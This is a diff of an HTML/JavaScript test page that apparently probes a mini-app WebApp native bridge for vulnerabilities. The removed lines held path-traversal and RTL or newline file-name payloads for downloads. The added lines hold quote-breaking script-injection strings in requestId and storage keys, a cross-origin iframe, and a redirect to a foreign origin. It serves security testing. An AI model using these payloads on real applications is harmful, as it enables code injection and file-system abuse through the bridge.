@@ -1,21 +1,20 @@
 <!doctype html>
-<html lang="en">
+<html lang="ru">
 <head>
 <meta charset="utf-8">
-<title>Download test</title>
+<title>Test page</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-  body{font:13px/1.45 ui-monospace,Menlo,monospace;margin:16px;max-width:760px}
-  button{display:block;width:100%;margin:3px 0;padding:7px;text-align:left;cursor:pointer;
-         font:inherit;background:#f6f6f6;border:1px solid #ccc;border-radius:4px}
-  button:hover{background:#eef4ff}
-  #log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:12px;
-       border-radius:4px;max-height:320px;overflow:auto}
-  h3{font-size:15px}
+  body{font:14px/1.5 ui-monospace,Menlo,monospace;margin:14px;max-width:760px}
+  button{display:block;width:100%;margin:6px 0;padding:10px;text-align:left;cursor:pointer;
+         font:inherit;background:#eef4ff;border:1px solid #88a;font-radius:6px}
+  button:hover{background:#dde8ff}
+  #log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:10px;
+       border-radius:4px;max-height:300px;overflow:auto}
+  .step{color:#336;font-weight:bold}
 </style>
 </head>
 <body>
-<h3>Download test</h3>
 <div id="meta"></div>
 <div id="buttons"></div>
 <div id="log">ready</div>
@@ -37,103 +36,61 @@ function wrapSendEvent(){
     WebApp.__wrapped = true; return true;
   } return false;
 }
-let weTry=0; const weTimer=setInterval(()=>{ if(wrapSendEvent()||++weTry>40) clearInterval(weTimer); },250);
+let weTry=0; const weTimer=setInterval(function(){ if(wrapSendEvent()||++weTry>40) clearInterval(weTimer); },250);
 
-function viaSdk(url,name){ return WebApp.downloadFile(url,name); }
-function viaRaw(url,name){
-  const p = "WebAppDownloadFile:" + JSON.stringify({url:url, file_name:name});
-  log("=> raw", p);
-  window.webkit.messageHandlers.EventHandler.postMessage(p);
+function raw(name,obj){
+  const p = name+":"+JSON.stringify(obj);
+  log("=>", p);
+  try{ window.webkit.messageHandlers.EventHandler.postMessage(p); }
+  catch(e){ log("raw throw:", e.message); }
 }
 
-const CASES = [
- {id:"C1", name:"probe-"+RUN+".txt"},
- {id:"C2", name:"../probe-up-"+RUN+".txt"},
- {id:"C3", name:"../../../../../../../tmp/probe-tmp-"+RUN+".txt"},
- {id:"C4", name:"/tmp/probe-abs-"+RUN+".txt"},
- {id:"C5", name:"~/probe-home-"+RUN+".txt"},
- {id:"C6", name:"sub/probe-nest-"+RUN+".txt"},
- {id:"C7", name:"\u202Etxt."+RUN+"\u202Cgnp-3lorp\u202E.."},
- {id:"C8", name:"probe-nl-"+RUN+".txt\n\nSAVED-TO:-/tmp\n.txt"},
-];
 const box = document.getElementById('buttons');
-CASES.forEach(c=>{
-  const b=document.createElement('button'); b.textContent=c.id+" sdk";
-  b.onclick=()=>{ log("=> sdk", c.name);
-    try{ const p=viaSdk(PROBE_URL,c.name); if(p&&p.catch)p.catch(e=>log("reject",e)); }
-    catch(e){ log("sdk throw:",e.message,"-> raw"); viaRaw(PROBE_URL,c.name); } };
-  box.appendChild(b);
-  const r=document.createElement('button'); r.textContent=c.id+" raw";
-  r.onclick=()=>{ try{ viaRaw(PROBE_URL,c.name); }catch(e){ log("raw throw:",e.message); } };
-  box.appendChild(r);
-});
 
-setTimeout(()=>{
-  const n="probe-ng-"+RUN+".txt"; log("=> auto (no gesture)", n);
-  try{ const p=viaSdk(PROBE_URL,n); if(p&&p.catch)p.catch(e=>log("auto reject",e)); }
-  catch(e){ log("auto throw:",e.message,"-> raw"); viaRaw(PROBE_URL,n); }
-},1500);
+// 1) K1 — главный тест: сырой requestId в native->JS ответе
+const b1=document.createElement('button');
+b1.innerHTML='<span class="step">ШАГ 1 — инъекция requestId (K1)</span><br>после клика жди ~3 сек и смотри строку "K1 result" внизу лога';
+b1.onclick=()=>{
+  raw("WebAppDeviceStorageGetKey",{requestId:'x"-window.__k1dq=1-"', key:'k'+RUN});
+  raw("WebAppDeviceStorageGetKey",{requestId:"x'-window.__k1sq=1-'", key:'k'+RUN});
+  raw("WebAppDeviceStorageGetKey",{requestId:'ok-'+RUN,            key:'k'+RUN});
+  setTimeout(()=>log("K1 result: __k1dq=", window.__k1dq, " __k1sq=", window.__k1sq), 3000);
+};
+box.appendChild(b1);
 
-fetch(PROBE_URL).then(r=>r.blob()).then(b=>{
-  const u=URL.createObjectURL(b);
-  const btn=document.createElement('button'); btn.textContent="C10 blob";
-  btn.onclick=()=>{ const n="probe-blob-"+RUN+".txt"; log("=> blob", n);
-    try{ const p=viaSdk(u,n); if(p&&p.catch)p.catch(e=>log("blob reject",e)); }
-    catch(e){ log("blob throw:",e.message); } };
-  box.appendChild(btn);
-}).catch(e=>log("blob fetch fail:",e.message));
+// 2) E1 — кавычки в key/value
+const b2=document.createElement('button');
+b2.innerHTML='<span class="step">ШАГ 2 — кавычки в key/value (E1)</span><br>аналогично, смотри "E1 result"';
+b2.onclick=()=>{
+  try{
+    WebApp.DeviceStorage.setItem('q"-window.__e1dq=1-"','v').catch(e=>log('e1a',e));
+    WebApp.DeviceStorage.setItem("q'-window.__e1sq=1-'",'v').catch(e=>log('e1b',e));
+    setTimeout(()=>{
+      WebApp.DeviceStorage.getItem('q"-window.__e1dq=1-"').catch(e=>log('e1c',e));
+      WebApp.DeviceStorage.getItem("q'-window.__e1sq=1-'").catch(e=>log('e1d',e));
+    },500);
+  }catch(e){ log('E1 throw', e.message); }
+  setTimeout(()=>log("E1 result: __e1dq=", window.__e1dq, " __e1sq=", window.__e1sq), 4000);
+};
+box.appendChild(b2);
 
+// 3) iframe (Г3): кнопки A и B внутри жёлтого фрейма ниже
+const lab=document.createElement('div');
+lab.innerHTML='<span class="step">ШАГ 3 — жёлтый фрейм ниже (чужой origin)</span>: нажми в нём <b>A</b>, потом <b>B</b>, потом вернись и сделай ШАГ 4';
+box.appendChild(lab);
+const f=document.createElement('iframe');
+f.src='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml';
+f.style.cssText='width:100%;height:120px;border:1px dashed #999;background:#fffbe6';
+box.appendChild(f);
+log('iframe loaded');
 
-// round 2: cross-origin frame (Г3) + escaping echo (Г2)
-(function(){
-  const CDN = location.hostname === 'nbafan00.github.io'
-    ? 'https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml' : 'child.html';
-  const f=document.createElement('iframe'); f.src=CDN; f.style.cssText='width:100%;height:70px;border:1px dashed #999;background:#fffbe6';
-  document.body.appendChild(f); log('iframe:', CDN);
+// 4) K3 — редирект ПОСЛЕДНИМ (уводит страницу)
+const b4=document.createElement('button');
+b4.innerHTML='<span class="step">ШАГ 4 — редирект на чужой origin (K3) — ДЕЛАЙ ПОСЛЕДНИМ</span><br>страница уйдёт на жёлтый приёмник: там нажми A и B — если мост жив, увидишь ответы "<=" внутри приёмника';
+b4.onclick=()=>{ log("=> K3 redirect"); setTimeout(function(){ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml'; },400); };
+box.appendChild(b4);
 
-  const b=document.createElement('button'); b.textContent='E1 escape-check (device storage)';
-  b.onclick=()=>{
-    const k1='q"-window.__dq=1-"';
-    const k2="q'-window.__sq=1-'";
-    try{
-      WebApp.DeviceStorage.setItem(k1,'v').then(()=>WebApp.DeviceStorage.getItem(k1)).catch(e=>log('e1a',e));
-      WebApp.DeviceStorage.setItem(k2,'v').then(()=>WebApp.DeviceStorage.getItem(k2)).catch(e=>log('e1b',e));
-    }catch(e){ log('e1 throw', e.message); }
-    setTimeout(()=>log('after escape-check: __dq=',window.__dq,'__sq=',window.__sq),2500);
-  };
-  box.appendChild(b);
-
-  const r=document.createElement('button'); r.textContent='R blob retry (wait 60s)';
-  r.onclick=async()=>{
-    try{ const b2=await (await fetch(PROBE_URL)).blob(); const u=URL.createObjectURL(b2);
-      log('=> blob retry'); const p=WebApp.downloadFile(u,'probe-blob2-'+RUN+'.txt'); if(p&&p.catch)p.catch(e=>log('blob2 reject',e));
-    }catch(e){ log('blob2 fetch fail',e.message); } };
-  box.appendChild(r);
-})();
-
-
-// round 3: K1 requestId-инъекция (native->JS) и K3 redirect (мост переживает смену origin)
-(function(){
-  const b=document.createElement('button'); b.textContent='K1 requestId inject';
-  b.onclick=()=>{
-    const evil1='x\"-window.__k1dq=1-\"';
-    const evil2="x\'-window.__k1sq=1-\'";
-    log('=> K1 raw GetKey with hostile requestId');
-    try{
-      window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:evil1,key:'k'+RUN}));
-      window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:evil2,key:'k'+RUN}));
-      window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:'ok-'+RUN,key:'k'+RUN}));
-    }catch(e){log('K1 throw',e.message);}
-    setTimeout(()=>log('K1 result: __k1dq=',window.__k1dq,'__k1sq=',window.__k1sq),2500);
-  };
-  box.appendChild(b);
-
-  const r=document.createElement('button'); r.textContent='K3 redirect (bridge on foreign origin)';
-  r.onclick=()=>{ log('=> K3 redirect to CDN child'); setTimeout(function(){ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml'; },300); };
-  box.appendChild(r);
-})();
-
-document.getElementById('meta').innerHTML="run: <b>"+RUN+"</b>";
+document.getElementById('meta').innerHTML="run: <b>"+RUN+"</b> — скопируй лог (внизу) после шагов 1-3, потом делай шаг 4";
 </script>
 </body>
 </html>
